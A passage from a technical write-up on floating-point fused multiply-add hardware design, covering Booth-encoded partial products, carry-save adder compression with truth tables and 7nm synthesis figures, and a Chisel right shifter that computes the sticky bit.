    &lt;p&gt;In \(Booth\) encoding, five types of partial products need to be calculated: \(0\), \(A\), \(2A\), \(-A\), \(-2A\). \(0\) and \(A\) require no computation, \(2A\) is obtained by a one-bit left shift, while \(-A\) and \(-2A\) require the operation of inversion plus one. This paper introduces a fast algorithm for handling inversion plus one.&lt;/p&gt;
    &lt;p&gt;To simplify the explanation of the principle, we assume computing \(f16\) with 11 significant bits, generating 6 partial products. Each partial product is 22 bits wide, as shown in the figure. The colored positions in the figure are 12 bits wide, representing \(A\) possibly multiplied by \(0\), \(1\), or \(2\). Since the last partial product's three-bit encoding is \(0\)xx, its value cannot be negative. Assuming all other partial products are negative, we invert and add one to each of them. The colored parts represent the results after inversion only. We place the added one for the current partial product into the corresponding position of the next partial product, ensuring the sum of partial products remains unchanged and avoiding the issue of a carry chain from adding one to the current partial product. The last partial product is non-negative and does not require this adjustment.&lt;/p&gt;
    &lt;p&gt;The \(1\) in the above figure can first be simplified through summation to obtain the result shown in the following figure.&lt;/p&gt;
    &lt;p&gt;If the actual partial product value is positive, the above result needs to be corrected by adding one to the bit position immediately to the left of the colored bit and setting the next partial product's tail addition to zero. As shown in the figure, \(Si\) (where \(i\) starts from \(0\)) represents the sign bit of the \(i\)-th partial product, transforming it into a general form where the colored position only computes \(0\), \(A\), \(2A\), \(\sim A\), or \(\sim 2A\), speeding up partial product generation.&lt;/p&gt;
    &lt;p&gt;One additional point to note is that the sum of partial products yields the multiplication result, but the summation of partial products may also generate carries. These carries are meaningless for multiplication, but they can cause erroneous carries when the product is added to a wider number. The correction method involves adding an extra bit to the most significant bit of the partial product, as illustrated.&lt;/p&gt;
    &lt;p&gt;This ensures that the carry is correct after summing all partial products. This concludes the introduction to Booth encoding. Note that the example uses an 11-bit multiplication. While \(f16\) and \(f64\) have an odd number of significant digits, \(f32\) has an even number, requiring slight differences in zero-padding the most significant bit. Other steps are similar and thus omitted.&lt;/p&gt;
    &lt;head rend="h5"&gt;\(CSA\) Compression&lt;/head&gt;
    &lt;p&gt;\(Carry\)-\(Save\)-\(Adder\) is a carry-save adder that compresses \(n\) addends into \(m\) addends ($m&lt;/p&gt;
    &lt;p&gt;Assuming the calculation of adding two binary numbers \(A+B\), the truth table for their sum and carry, where \(A[i]+B[i]\) is the decimal result and also the count of \(1\)s in \(A[i]\) and \(B[i]\):&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="5"&gt;
        &lt;cell role="head"&gt;\(A[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(B[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(A[i] + B[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(Sum[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(Car[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(2\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Simplified into the following logical expression:&lt;/p&gt;
    &lt;p&gt;\(Sum = A\) ^ \(B\)&lt;/p&gt;
    &lt;p&gt;\(Car = A\) &amp;amp; \(B\)&lt;/p&gt;
    &lt;p&gt;\(Result = A+B = Sum + (Car &amp;lt;&amp;lt; 1)\)&lt;/p&gt;
    &lt;p&gt;For three-number addition, the sum is the XOR of two numbers, and the carry occurs when both numbers are \(1\). \((Car &amp;lt;&amp;lt; 1)\) reflects that the current bit's carry propagates to the next bit. This derivation is for clarity; in practice, generating sum and carry from two addends does not accelerate addition.&lt;/p&gt;
    &lt;p&gt;Suppose we want to calculate the sum of three numbers \(A+B+C\), where the \(CSA\) key is to generate the sum and carry, as shown in the truth table:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="6"&gt;
        &lt;cell role="head"&gt;\(A[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(B[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(C[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(A[i] + B[i] + C[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(Sum[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(Car[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(2\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(2\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(2\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(3\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;From the above table, some patterns can be observed. The generation of \(Sum[i]\) and \(Car[i]\) actually depends only on the sum of \(A[i]+B[i]+C[i]\), i.e., the number of \(1\)s in \(A[i]\), \(B[i]\), and \(C[i]\). The simplified expression is as follows:&lt;/p&gt;
    &lt;p&gt;\(Sum = A\) ^ \(B\) ^ \(C\)&lt;/p&gt;
    &lt;p&gt;\(Car = (A\) &amp;amp; \(B) \quad | \quad (A\) &amp;amp; \(C) \quad | \quad (B\) &amp;amp; \(C)\)&lt;/p&gt;
    &lt;p&gt;\(Result = A+B+C = Sum + (Car &amp;lt;&amp;lt; 1)\)&lt;/p&gt;
    &lt;p&gt;For three-number addition, the sum is the XOR of the three numbers, and the carry occurs when at least two numbers are \(1\). \((Car &amp;lt;&amp;lt; 1)\) accounts for the current bit's carry propagating to the next bit. This method converts three-number addition into two-number addition with just two XOR gate delays, significantly saving time, especially for longer bit widths.&lt;/p&gt;
    &lt;p&gt;Adding four numbers is slightly more complex because when all four are \(1\), the sum is \(4\), requiring a carry of \(2\). We designate one carry as \(Cout\) and the other as \(Car\). The \(Cout\) generated from the current four-bit addition is passed to the next stage as \(Cin\). With \(Cin\) and the four numbers, the operation now involves five inputs: \(A[i]\), \(B[i]\), \(C[i]\), \(D[i]\), and \(Cin[i]\), producing three outputs: \(Sum[i]\), \(Cout[i]\), and \(Car[i]\). The least significant bit's \(Cin[0]\) is \(0\), while other bits' \(Cin[i]\) is the \(Cout[i-1]\) from the previous bit, as shown in the table.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;\(A[i]+B[i]+C[i]+D[i]+Cin[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(Sum[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(Cout[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(Car[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(2\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1/0\)&lt;/cell&gt;
        &lt;cell&gt;\(0/1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(3\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1/0\)&lt;/cell&gt;
        &lt;cell&gt;\(0/1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(4\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(5\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;There are many ways to simplify this truth table. One feasible method is described below. The value of \(Sum[i]\) can be easily derived as the XOR of the five inputs: \(Sum[i] = A[i]\)^\(B[i]\)^\(C[i]\)^\(D[i]\)^\(Cin[i]\). \(Car[i]\) and \(Cout[i]\) are more complex. We define \(Cout[i]\) to be generated only by the first three numbers, i.e., when the sum of the first three numbers is greater than \(1\), \(Cout[i] = 1\). The table shows the truth table for \(Cout[i]\):&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;\(A[i]+B[i]+C[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(Cout[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(2\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(3\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;\(Cout[i]\) can be expressed as: \(Cout[i] = (A[i]\)^\(B[i])?C[i]:A[i]\), while \(Car[i]\) is generated by \(D[i]\) and \(Cin[i]\), with the table showing the truth table for \(Car[i]\).&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;\(A[i]+B[i]+C[i]+D[i]\)&lt;/cell&gt;
        &lt;cell role="head"&gt;\(Car[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(0\)&lt;/cell&gt;
        &lt;cell&gt;\(D[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(Cin[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(2\)&lt;/cell&gt;
        &lt;cell&gt;\(D[i]\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(3\)&lt;/cell&gt;
        &lt;cell&gt;\(Cin[i]\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;\(Car[i]\) can be expressed as: \(Car[i] = (A[i]\) ^ \(B[i]\) ^ \(C[i]\) ^ \(D[i]) ? Cin[i] : D[i]\). Specifically, when \((A[i]\) ^ \(B[i]\) ^ \(C[i]\) ^ \(D[i]) = 1\), \(A[i]+B[i]+C[i]+D[i] = 1/3\), and \(Cin[i] = 1\) will generate a carry. When \((A[i]\) ^ \(B[i]\) ^ \(C[i]\) ^ \(D[i]) = 0\), \(A[i]+B[i]+C[i]+D[i] = 0/4\). Here, \(D[i] = 0\) indicates \(A[i]+B[i]+C[i]+D[i] = 0\), and adding \(Cin\) will not produce a carry, while \(D[i] = 1\) indicates \(A[i]+B[i]+C[i]+D[i] = 4\), and adding \(Cin\) will generate a carry. Based on the above derivation, the expression for \(CSA4\_2\) is as follows:&lt;/p&gt;
    &lt;p&gt;Sum[i] = A[i] ^ B[i] ^ C[i] ^ D[i] ^ Cin[i], Cin[i] = Cout[i-1], Cin[0] = 0&lt;/p&gt;
    &lt;p&gt;\(Cout[i] = (A[i]\) ^ \(B[i])?C[i]:A[i]\)&lt;/p&gt;
    &lt;p&gt;\(Car[i] = (A[i]\) ^ \(B[i]\) ^ \(C[i]\) ^ \(D[i])?Cin[i]:D[i]\)&lt;/p&gt;
    &lt;p&gt;\(Result = A+B+C+D = Sum + (Car &amp;lt;&amp;lt; 1)\)&lt;/p&gt;
    &lt;p&gt;Using the \(TSMC7nm\) process library, a comprehensive comparison of delay and area was conducted for different input XOR gates, \(CSA3\_2\), and \(CSA4\_2\). The synthesis results for different input XOR gates are shown in the table.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;\(106\) bits&lt;/cell&gt;
        &lt;cell role="head"&gt;Delay (\(ps\))&lt;/cell&gt;
        &lt;cell role="head"&gt;Area (\(um²\))&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(A\)^\(B\)&lt;/cell&gt;
        &lt;cell&gt;\(13.74\)&lt;/cell&gt;
        &lt;cell&gt;\(38.66880\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(A\)^\(B\)^\(C\)&lt;/cell&gt;
        &lt;cell&gt;\(23.01\)&lt;/cell&gt;
        &lt;cell&gt;\(63.09120\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(A\)^\(B\)^\(C\)^\(D\)&lt;/cell&gt;
        &lt;cell&gt;\(24.69\)&lt;/cell&gt;
        &lt;cell&gt;\(87.51360\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(A\)^\(B\)^\(C\)^\(D\)^\(E\)&lt;/cell&gt;
        &lt;cell&gt;\(37.21\)&lt;/cell&gt;
        &lt;cell&gt;\(99.72480\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;The synthesis results of \(CSA3\_2\) and \(CSA4\_2\) are shown in the table.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;\(106\) bits&lt;/cell&gt;
        &lt;cell role="head"&gt;Delay (\(ps\))&lt;/cell&gt;
        &lt;cell role="head"&gt;Area (\(um²\))&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;\(CSA3\_2\)&lt;/cell&gt;
        &lt;cell&gt;\(23.23\)&lt;/cell&gt;
        &lt;cell&gt;\(104.42880\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(CSA4\_2\)&lt;/cell&gt;
        &lt;cell&gt;\(40.63\)&lt;/cell&gt;
        &lt;cell&gt;\(237.86881\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;It can be seen that although \(CSA4\_2\) theoretically has a delay of three XOR gates and \(CSA3\_2\) theoretically has a delay of two XOR gates, in actual physical implementation, \(CSA4\_2\) is only slightly faster than two levels of \(CSA3\_2\). Therefore, \(CSA3\_2\) should be used whenever possible, unless one level of \(CSA4\_2\) can replace two levels of \(CSA3\_2\), such as in \(4-&amp;gt;2\) compression or \(8-&amp;gt;2\) compression.&lt;/p&gt;
    &lt;head rend="h5"&gt;CSAn_2&lt;/head&gt;
    &lt;p&gt;For two unsigned integer multiplications using Booth encoding, the number of partial products is ceil((n+1)/2). To ensure correct carry propagation, the partial product bit width is extended by one bit. The number and bit width of partial products for each data format are listed in the table.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Data Format&lt;/cell&gt;
        &lt;cell role="head"&gt;Number of significant digits&lt;/cell&gt;
        &lt;cell role="head"&gt;Number of partial products&lt;/cell&gt;
        &lt;cell role="head"&gt;Partial product bit width&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(fp16\)&lt;/cell&gt;
        &lt;cell&gt;\(11\)&lt;/cell&gt;
        &lt;cell&gt;\(6\)&lt;/cell&gt;
        &lt;cell&gt;\(12\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(fp32\)&lt;/cell&gt;
        &lt;cell&gt;\(24\)&lt;/cell&gt;
        &lt;cell&gt;\(13\)&lt;/cell&gt;
        &lt;cell&gt;\(25\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(fp64\)&lt;/cell&gt;
        &lt;cell&gt;\(53\)&lt;/cell&gt;
        &lt;cell&gt;\(27\)&lt;/cell&gt;
        &lt;cell&gt;54&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Following the principle of prioritizing \(CSA3\_2\) unless one level of \(CSA4\_2\) can replace two levels of \(CSA3\_2\), the number of \(CSA3\_2\) and \(CSA4\_2\) stages used for each data format is listed in the table.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Data Format&lt;/cell&gt;
        &lt;cell role="head"&gt;Number of \(CSA3\_2\) Stages&lt;/cell&gt;
        &lt;cell role="head"&gt;\(CSA4\_2\) Stages&lt;/cell&gt;
        &lt;cell role="head"&gt;Process (\(-&amp;gt;\) denotes \(CSA3\_2\), \(--&amp;gt;\) denotes \(CSA4\_2\))&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(fp16\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(6-&amp;gt;4--&amp;gt;2\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(fp32\)&lt;/cell&gt;
        &lt;cell&gt;\(3\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;\(13-&amp;gt;9-&amp;gt;6-&amp;gt;4--&amp;gt;2\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(fp64\)&lt;/cell&gt;
        &lt;cell&gt;\(3\)&lt;/cell&gt;
        &lt;cell&gt;\(2\)&lt;/cell&gt;
        &lt;cell&gt;\(27-&amp;gt;18-&amp;gt;12-&amp;gt;8--&amp;gt;4--&amp;gt;2\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h5"&gt;Exponent processing and right shift&lt;/head&gt;
    &lt;p&gt;Following conventional methods, if the exponent relationship between the product of \(fp\_a\) and \(fp\_b\) and the exponent of \(fp\_c\) is unknown, the smaller exponent must be right-shifted, similar to floating-point addition. This would require both the significand of the \(fp\_a\) and \(fp\_b\) product and the significand of \(fp\_c\) to potentially shift right, necessitating two shifters and increasing area. Additionally, waiting for the \(fp\_a\) and \(fp\_b\) product to be computed before right-shifting its significand increases circuit latency. An alternative algorithm avoids using two shifters and reduces latency by parallelizing the computation with the \(fp\_a\) and \(fp\_b\) product.&lt;/p&gt;
    &lt;p&gt;The exponent bits are treated as unsigned numbers, but there is an exponent bias between them and the actual exponent. Additionally, the \(denormal\) case must be considered. Let \(E\_fix\) denote the exponent bits after handling the \(denormal\) case, and \(E\_bit\) denote the original exponent bits. When all bits of \(E\_bit\) are 0, \(E\_fix = 1\); otherwise, \(E\_fix = E\_bit\).&lt;/p&gt;
    &lt;p&gt;In the above equation, the true exponent \(E\_real\) equals \(E\_fix\) minus a bias value \(bias\), where \(exponentWidth\) is the width of \(E\_bit\), and \(bias\) equals the value where the highest bit of \(E\_bit\) is \(0\) and all other bits are \(1\). Without considering the carry or borrow of the significand product, the true exponent result \(Eab\_real\) of multiplying \(fp\_a\) and \(fp\_b\) is given by:&lt;/p&gt;
    &lt;p&gt;The calculation formula for the binary exponent result \(Eab\_bit\) of the multiplication of \(fp\_a\) and \(fp\_b\) is shown below:&lt;/p&gt;
    &lt;p&gt;The operation of \(+\)&amp;amp; extends the result of \(Ea\_fix + Eb\_fix\) by one bit to retain the carry. The carry is preserved because a bias value will be subtracted later, and without retaining the carry, the result would be incorrect. Additionally, subtracting the bias might result in a negative value, so another bit is extended by appending a 0 at the highest bit. Finally, the bias \(bias\) is subtracted, yielding the binary exponent result \(Eab\_bit\) for the multiplication of \(fp\_a\) and \(fp\_b\) without considering the carry or borrow from the significand product. Then, we construct an exponent \(Eab\) with the following value:&lt;/p&gt;
    &lt;p&gt;Assuming the binary exponent result of multiplying \(fp\_a\) and \(fp\_b\) is \(Eab\), to ensure lossless precision when adding the significant digits of \(fp\_a \times fp\_b\) and \(fp\_c\), both addends are extended in width. The significant digits of \(fp\_c\) are extended to \(3 \times significandWidth + 4\), with the bit distribution shown in the figure. Here, \(g0\), \(r0\), \(g1\), and \(r1\) are used to preserve the \(guard\) and \(round\) bits during right-shifting:&lt;/p&gt;
    &lt;p&gt;As shown above, the significand of \(fp\_c\) is \(significandWidth+2\) bits wider than the product of the significands of \(fp\_a\) and \(fp\_b\). Since the product result has two digits before the decimal point, aligning it as \(1\).xxx requires \(significandWidth+3\) bits, which explains why \(rshiftBasic = significandWidth+3\).&lt;/p&gt;
    &lt;p&gt;Let \(fp\_c\_significand\_cat0 = Cat(fp\_c\_significand, 0.U(2 \times significandWidth + 4))\), where \(fp\_c\_significand\) is the significand of \(fp\_c\). If \(Ec\_fix = Eab = Eab\_bit + rshiftBasic.S\), \(fp\_c\_significand\_cat0\) is exactly \(significandWidth + 3\) larger than \(Eab\_bit\), so no right shift is needed for alignment. If \(Ec\_fix &amp;gt; Eab\), theoretically \(fp\_c\_significand\_cat0\) would require a left shift, but due to the presence of \(g0\) and \(g1\) as buffers and the fact that lower bits cannot generate carry (only affecting rounding), no actual left shift is needed. If \(Ec\_fix &amp;lt; Eab\), \(fp\_c\_significand\_cat0\) must be right-shifted by \(rshift\_value = Eab - Cat(0.U, Ec\_fix).asSInt\). Since \(rshift\_value\) is derived from the addition of multiple numbers, its LSB is computed first. Thus, during right-shifting, the LSB of \(rshift\_value\) is first used as the Mux select signal, followed by higher bits. The shifting process must compute \(guard\), \(round\), and \(sticky\) (collectively \(grs\)). For \(guard\) and \(round\), these positions are already preserved during bit-width extension, requiring no additional computation. For \(sticky\), two methods exist: (1) Extend the bit-width further to store shifted-out bits and compute \(sticky\) after all shifts, or (2) Compute \(sticky\) during shifting based on Mux select signals. Method 2 offers lower latency than Method 1. Below is the design code for Method 2:&lt;/p&gt;
    &lt;code&gt;/**
 * 使用Mux进行移位，先用最低位，输出位宽为srcValue + 1(Sticky)
 */
def shiftRightWithMuxSticky(srcValue: UInt, shiftValue: UInt): UInt = {
  val vecLength  = shiftValue.getWidth + 1
  val res_vec    = Wire(Vec(vecLength,UInt(srcValue.getWidth.W)))
  val sticky_vec = Wire(Vec(vecLength,UInt(1.W)))
  res_vec(0)    := srcValue
  sticky_vec(0) := 0.U
  for (i &amp;lt;- 0 until shiftValue.getWidth) {
    res_vec(i+1) := Mux(shiftValue(i), res_vec(i) &amp;gt;&amp;gt; (1&amp;lt;&amp;lt;i), res_vec(i))
    sticky_vec(i+1) := Mux(shiftValue(i), sticky_vec(i) | res_vec(i)((1&amp;lt;&amp;lt;i)-1,0).orR,
    sticky_vec(i))
  }
  Cat(res_vec(vecLength-1),sticky_vec(vecLength-1))
}
&lt;/code&gt;
    &lt;p&gt;There is another method to speed up the right shift. The bit width of \(rshift\_value\) is \(exponentWidth+1\), while the width of \(fp\_c\_significand\_cat0\) is \(3*significandWidth+4\). There may be overflow bits in \(rshift\_value\). For example, using a 5-bit number to right-shift a 7-bit number, \(a(6,0) &amp;gt;&amp;gt; b(4,0)\), the maximum value of the third bit in \(b\) is \(7\), which is sufficient for the bit width of \(a\). Therefore, if the upper two bits of \(b\) contain any non-zero value, the right-shift result of \(a\) will be zero. The right-shift result can be simplified to \(Mux(b(4,3).orR,0.U, a(6,0) &amp;gt;&amp;gt; b(2,0))\). The table below lists the bit widths of \(rshift\_value\) used for three floating-point data formats.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Data Format&lt;/cell&gt;
        &lt;cell role="head"&gt;\(fp\_c\_significand\_cat0\) bit width&lt;/cell&gt;
        &lt;cell role="head"&gt;Bit Width of \(rshift\_value\)&lt;/cell&gt;
        &lt;cell role="head"&gt;Bit width used&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(f16\)&lt;/cell&gt;
        &lt;cell&gt;\(37\)&lt;/cell&gt;
        &lt;cell&gt;\(6\)&lt;/cell&gt;
        &lt;cell&gt;\(6\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(f32\)&lt;/cell&gt;
        &lt;cell&gt;\(76\)&lt;/cell&gt;
        &lt;cell&gt;\(9\)&lt;/cell&gt;
        &lt;cell&gt;\(7\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(f64\)&lt;/cell&gt;
        &lt;cell&gt;\(163\)&lt;/cell&gt;
        &lt;cell&gt;\(12\)&lt;/cell&gt;
        &lt;cell&gt;\(8\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;There are three cases based on the value of \(rshift\_value\): \(rshift\_value &amp;lt;= 0\) means no right shift is needed, and the \(sticky\) result is \(0\); \(rshift\_value &amp;gt; rshiftMax\) means the right shift result is \(0\), and the \(sticky\) result is \(fp\_c\_significand\_cat0\) or reduced; \(0 &amp;lt; rshift\_value &amp;lt;= rshiftMax\) means the right shift result and \(sticky\) are calculated by \(shiftRightWithMuxSticky\).&lt;/p&gt;
    &lt;p&gt;Thus, this section has covered the methods for exponent processing, the design of the right shifter, and the handling of \(grs\) during the right-shift operation.&lt;/p&gt;
    &lt;head rend="h5"&gt;Significand addition&lt;/head&gt;
